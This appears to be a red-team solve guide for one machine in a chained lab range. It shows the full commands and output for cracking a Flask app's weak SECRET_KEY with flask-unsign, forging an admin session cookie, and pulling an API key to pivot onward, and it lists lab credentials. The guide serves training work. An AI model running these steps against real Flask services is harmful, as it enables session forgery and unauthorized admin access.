# Red Team Solve Guide — M3
## RNG-EXT-01 | M3-ext-auth-portal | Flask Weak SECRET_KEY → Session Cookie Forge
**Technique:** T1606.001 — Forge Web Credentials: Web Cookies  
**Pivot In:** `svcananya:BunlStaff@2025!` (from M2 GraphQL systemConfig)  
**Pivot Out:** Meter API key `soap-9f3b2d1e7a8c4f6d` → M4 (Meter Data Exchange API, port 8000)

---

## Objective
The BUNL Staff Authentication Portal uses Flask with a weak `SECRET_KEY`. Log in as a normal staff user to observe the session cookie structure, brute-force the secret with `flask-unsign`, then forge an admin session cookie to access the admin panel containing the Meter API key.

---

## Step 1 — Login as Normal Staff and Capture Cookie

```bash
# Login with M2 credentials and capture the session cookie
curl -c /tmp/m3_cookie.txt -X POST http://203.x.x.x:5000/login \
  -d "username=svcananya&password=BunlStaff%402025%21" -L -o /dev/null -v 2>&1 | grep "Set-Cookie"
# session=eyJkZXBhcnRtZW50...

# Extract just the cookie value
SESSION=$(grep "session=" /tmp/m3_cookie.txt | awk '{print $NF}')
echo $SESSION
```

Decode the cookie (base64 + inspect):
```bash
echo $SESSION | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool
# Shows: {"department": "IT Operations", "full_name": "...", "role": "staff", "staff_user": "svcananya"}
```

---

## Step 2 — Brute-Force the Flask SECRET_KEY

```bash
# Install flask-unsign
pip3 install flask-unsign wordlist --break-system-packages

# Save the cookie to a file for easier use
echo "$SESSION" > /tmp/m3_session.txt

# Brute-force with rockyou
flask-unsign --unsign --cookie "$SESSION" --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
```

Result:
```
[*] Session decodes to: {'department': 'IT Operations', 'full_name': 'Sonal Vaidya-Cananya', 'role': 'staff', 'staff_user': 'svcananya'}
[+] Found secret key after 1 attempts: letmein
```

The secret key is `letmein` — found at line 1 of rockyou.txt.

---

## Step 3 — Forge an Admin Session Cookie

```bash
# Forge a session cookie with role=admin
flask-unsign --sign --cookie \
  '{"department": "IT Administration", "full_name": "Portal Administrator", "role": "admin", "staff_user": "padmin"}' \
  --secret "letmein"
# Output: eyJkZXBhcnRtZW50IjoiSVQgQWRtaW5pc3RyYXRpb24i...
```

---

## Step 4 — Access Admin Panel with Forged Cookie

```bash
FORGED="<output from flask-unsign --sign>"
curl -b "session=${FORGED}" http://203.x.x.x:5000/admin | grep -i "soap-\|api_key\|meter"
```

Admin panel response shows the **Meter Data Exchange API Configuration**:
```
API Endpoint: http://meter-api.bunl-internal.net:8000/api/meter/submit
API Key:      soap-9f3b2d1e7a8c4f6d
```

---

## Step 5 — Verify Pivot to M4

```bash
curl -s -H "X-API-KEY: soap-9f3b2d1e7a8c4f6d" \
  http://203.x.x.x:8000/api/meter/schema | grep "MeterId"
# Returns XML schema — API key confirmed valid
```

---

## Summary

| Item | Value |
|---|---|
| Vulnerability | Flask weak SECRET_KEY `letmein` → cookie forgery (CWE-321) |
| Tool | `flask-unsign` |
| Forged Session | role=admin, staff_user=padmin |
| Credential Obtained | Meter API Key: `soap-9f3b2d1e7a8c4f6d` |
| Next Machine | M4 — Meter Data Exchange API (port 8000) |
| MITRE | T1606.001 |
